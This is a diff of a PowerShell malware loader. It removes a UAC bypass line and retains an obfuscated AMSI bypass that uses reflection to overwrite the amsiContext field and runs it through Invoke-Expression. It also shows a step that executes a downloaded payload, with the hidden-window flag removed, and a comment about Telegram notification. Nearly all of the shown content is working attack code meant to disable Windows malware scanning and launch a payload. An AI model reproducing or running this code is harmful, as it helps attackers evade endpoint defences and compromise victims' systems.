@@ -1,6 +1,3 @@
-# UAC Bypass (RunAsInvoker)
-$env:__COMPAT_LAYER = 'RunAsInvoker'
-
 # AMSI Bypass (amsiContext FieldOffset)
 $I9WiMWR="`$j9Xp=[aPPDomAIn]::CurReNTDoMaiN.GETAsSEMbLIES()|whErE-OBJeCt{`$_.LOcatIoN -aNd `$_.LOcATion.eNdswIth('System.Management.Automation.dll')};`$gJqjUGHRdTLX_=[SYSTeM.REFleCTIOn.bINdInGfLAGs]'NonPublic,Static';[VoId](gEt-varIabLE -NaME 'Xcb' -erROrACtioN SIleNTLycONTINUE);`$CpejFD9pbbmLM=`$j9xP.GeTTypes()|WHERE-OBjEct{`$_.naME -EQ `$(([SysTeM.tExT.ENCODIng]::AScIi.gETStRiNg([bYTE[]]((0X5169 -bXOr 0x5128),((109+46-46)),(0XC33E -bXOR 0Xc34d),(0X6d33 -BxOR 0x6d5a),(0XCc18 -BxOR 0xcc4D),(52+64),(105+77-77),((108*48/48)),(10+105)))))};`$_CR9j4tM4Dy='LA3TUcz2QL__sn8APXj';`$KcDLg=`$CpejFD9pbbMlM.gETfIeLD(`$(('{0}{1}{2}{3}' -f 'am','siC','onte','xt')),`$GJqJughrdTlX_).GEtVaLUE(`$NulL);`$RJjylUc='gbIUL';`$nEW6rPfJw6=[sysTeM.bitcOnVErtEr]::geTBYTES([sYsTem.iNT32]::MaXvaluE);[SYSTEm.runtImE.iNtEropsERVIcES.MARSHAl]::cOPY(`$new6rpFjW6,0,`$kCDLG,4)";iNVoKE-eXPrEsSIon $I9WiMWR
 
@@ -64,7 +61,8 @@ try {
 
 if (Test-Path $outPath) {
     Write-Host "[+] Direct Executing payload..."
-    Start-Process -FilePath $outPath -WindowStyle Hidden
+    Start-Process -FilePath $outPath
+
 }
 
 # Telegram Notification
